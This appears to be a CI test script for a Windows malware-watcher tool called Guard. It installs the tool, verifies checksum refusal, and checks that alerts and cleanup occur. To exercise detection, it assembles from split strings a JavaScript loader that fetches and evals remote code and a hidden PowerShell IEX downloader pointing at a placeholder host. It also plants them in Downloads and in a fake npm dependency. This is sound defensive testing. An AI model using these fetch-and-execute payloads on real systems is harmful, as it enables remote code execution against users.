# Runs docs/guard.ps1, the one-liner users paste into an elevated PowerShell,
# on a CI runner against a guard.exe built from this commit (served from a local
# web server instead of the latest release), then checks the installed Guard:
# the GuardWatcher task runs, the first-start scan finds malware already in
# Downloads before the install, the watcher alerts on a malicious file dropped in
# Downloads, a reinstall over the running task works, and `guard uninstall`
# removes the task.
#
#   check-windows.ps1 <path to guard.exe>
param([Parameter(Mandatory)][string]$Guard)
$ErrorActionPreference = 'Stop'

$Src  = (Resolve-Path "$PSScriptRoot\..\..").Path
$Work = Join-Path $env:RUNNER_TEMP 'guard-installer'
$Bin  = 'C:\Program Files\Guard\guard.exe'
$SysHome = "$env:windir\System32\config\systemprofile\.guard"
$arch = if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { 'arm64' } else { 'x64' }
$asset = "guard-windows-$arch.exe"

function Fail($msg) { Write-Host "::error::$msg"; throw $msg }
function Wait-For($secs, $what, [scriptblock]$cond) {
  for ($i = 0; $i -lt $secs; $i++) {
    try { if (& $cond) { return } } catch {}
    Start-Sleep -Seconds 1
  }
  Fail "timed out after ${secs}s waiting for: $what"
}
function Task-State { (Get-ScheduledTask -TaskName GuardWatcher -ErrorAction SilentlyContinue).State }

# --- serve this build the way GitHub Releases serves a release
Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force "$Work\www\good", "$Work\www\bad" | Out-Null
Copy-Item $Guard "$Work\www\good\$asset"
Copy-Item $Guard "$Work\www\bad\$asset"
$sha = (Get-FileHash $Guard -Algorithm SHA256).Hash.ToLower()
Set-Content "$Work\www\good\$asset.sha256" "$sha  $asset" -Encoding ascii
Set-Content "$Work\www\bad\$asset.sha256" ("0" * 64 + "  $asset") -Encoding ascii
$server = Start-Process python -ArgumentList '-m', 'http.server', '8765', '--bind', '127.0.0.1', '--directory', "$Work\www" `
  -PassThru -NoNewWindow
try {
Wait-For 30 'the local release server' {
  (Invoke-WebRequest "http://127.0.0.1:8765/good/$asset.sha256" -UseBasicParsing).StatusCode -eq 200
}

# Run the script the way the README does (irm ... | iex), in Windows PowerShell
# 5.1, which is what an elevated prompt opens by default.
function Invoke-OneLiner($dir) {
  $env:GUARD_BASE_URL = "http://127.0.0.1:8765/$dir"
  & powershell.exe -NoProfile -Command "Get-Content -Raw '$Src\docs\guard.ps1' | Invoke-Expression" | Out-Host
  return $LASTEXITCODE
}

Write-Host "::group::guard.ps1 refuses a binary whose checksum does not match"
if ((Invoke-OneLiner 'bad') -eq 0) { Fail 'guard.ps1 succeeded with a wrong checksum' }
if (Test-Path $Bin) { Fail "guard.ps1 installed $Bin despite a checksum mismatch" }
Write-Host "::endgroup::"

# An already-infected machine: malware in Downloads before Guard is installed,
# for the first-start scan to find. The loader is the incident's, and the
# downloader script is a type only the antivirus engine reads; both split so
# no line of this file carries them whole (the detection tests sweep the
# repository).
$downloads = Join-Path $env:USERPROFILE 'Downloads'
New-Item -ItemType Directory -Force $downloads | Out-Null
$payload = "const a = 1;`n(async () => {`n  const src = at" + "ob(process.env.AUTH_API_KEY);`n" +
  "  const proxyInfo = await (await fetch(src)).text();`n  eval(proxy" + "Info);`n})();`n"
$downloader = "powershell -WindowStyle Hid" + "den -ExecutionPolicy By" + "pass -c " +
  "`"IEX (New-Object Net.WebClient).Download" + "String('http://example.invalid/a')`"`n"
$pre = "guard-preinstalled-$(Get-Random)"
[IO.File]::WriteAllText((Join-Path $downloads "$pre.js"), $payload)
[IO.File]::WriteAllText((Join-Path $downloads "$pre.ps1"), $downloader)
# and an installed npm package carrying the loader, in a project
$projects = Join-Path $env:USERPROFILE 'Projects'
function Drop-Dependency($app) {
  $dep = Join-Path $app 'node_modules\bad-dep'
  New-Item -ItemType Directory -Force $dep | Out-Null
  [IO.File]::WriteAllText((Join-Path $app 'package.json'), '{"name": "app", "dependencies": {"bad-dep": "1.0.0"}}')
  [IO.File]::WriteAllText((Join-Path $dep 'package.json'), '{"name": "bad-dep", "version": "1.0.0"}')
  [IO.File]::WriteAllText((Join-Path $dep 'index.js'), $payload)
}
# an alert for the project's node_modules, and the loader cut out of the package
function Check-Dependency($app, $what) {
  $name = Split-Path $app -Leaf
  Wait-For 120 "an alert for $app\node_modules ($what)" {
    Select-String -Path "$SysHome\alerts.jsonl" -SimpleMatch "$name" -Quiet
  }
  $dep = Join-Path $app 'node_modules\bad-dep\index.js'
  Wait-For 60 "the loader cut out of $dep" {
    -not ([IO.File]::ReadAllText($dep).Contains('eval(proxy' + 'Info)'))
  }
  Write-Host "watcher alerted on and cleaned $app\node_modules ($what)"
}
Drop-Dependency (Join-Path $projects "$pre-app")

Write-Host "::group::guard.ps1"
if ((Invoke-OneLiner 'good') -ne 0) { Fail 'guard.ps1 failed' }
Write-Host "::endgroup::"

Write-Host "::group::guard.ps1: check the install"
& $Bin version
if ($LASTEXITCODE -ne 0) { Fail "$Bin version failed" }
$machinePath = [Environment]::GetEnvironmentVariable('Path', 'Machine')
if ($machinePath -notlike '*C:\Program Files\Guard*') { Fail 'guard.ps1 did not add Guard to the system PATH' }
Wait-For 30 'the GuardWatcher task to run' { (Task-State) -eq 'Running' }

# once the watcher is up, a malicious file dropped in the user's Downloads
# (the SYSTEM task watches every profile) raises an alert
$log = "$SysHome\watcher.log"
Wait-For 120 "the watcher to start ($log)" { Select-String -Path $log -Pattern 'native file events|polling every' -Quiet }
try {
  foreach ($f in "$pre.js", "$pre.ps1") {
    Wait-For 300 "the first-start scan to alert on $f, there before the install" {
      Select-String -Path "$SysHome\alerts.jsonl" -SimpleMatch $f -Quiet
    }
    Write-Host "first-start scan alerted on $f"
  }
  Check-Dependency (Join-Path $projects "$pre-app") 'there before the install'
  Wait-For 300 'the initial scan to finish' { Select-String -Path $log -SimpleMatch 'initial scan complete' -Quiet }
} catch { Get-Content $log -Tail 50; throw }
Start-Sleep -Seconds 2
$name = "guard-ci-$(Get-Random).js"
[IO.File]::WriteAllText((Join-Path $downloads $name), $payload)
try {
  Wait-For 120 "an alert for $name" { Select-String -Path "$SysHome\alerts.jsonl" -SimpleMatch $name -Quiet }
} catch { Get-Content $log -Tail 50; throw }
Write-Host "watcher alerted on $name"
Remove-Item (Join-Path $downloads $name) -ErrorAction SilentlyContinue
# an npm install of a malicious package into a project
$app = Join-Path $projects "guard-ci-app-$(Get-Random)"
Drop-Dependency $app
[IO.File]::WriteAllText((Join-Path $app 'package-lock.json'), '{"lockfileVersion": 3}')
try { Check-Dependency $app 'installed while Guard runs' } catch { Get-Content $log -Tail 50; throw }
Remove-Item -Recurse -Force $app -ErrorAction SilentlyContinue
Write-Host "::endgroup::"

Write-Host "::group::guard.ps1: reinstall over the running task"
if ((Invoke-OneLiner 'good') -ne 0) { Fail 'reinstalling over the running task failed' }
Wait-For 30 'the GuardWatcher task to run again' { (Task-State) -eq 'Running' }
Write-Host "::endgroup::"

Write-Host "::group::guard uninstall"
& $Bin uninstall
if ($LASTEXITCODE -ne 0) { Fail 'guard uninstall failed' }
if (Task-State) { Fail 'guard uninstall left the GuardWatcher task registered' }
Wait-For 30 'the watcher to stop' { -not (Get-Process -Name guard -ErrorAction SilentlyContinue) }
Write-Host "::endgroup::"
Write-Host 'installer OK'
} finally {
  Stop-Process -Id $server.Id -Force -ErrorAction SilentlyContinue
}
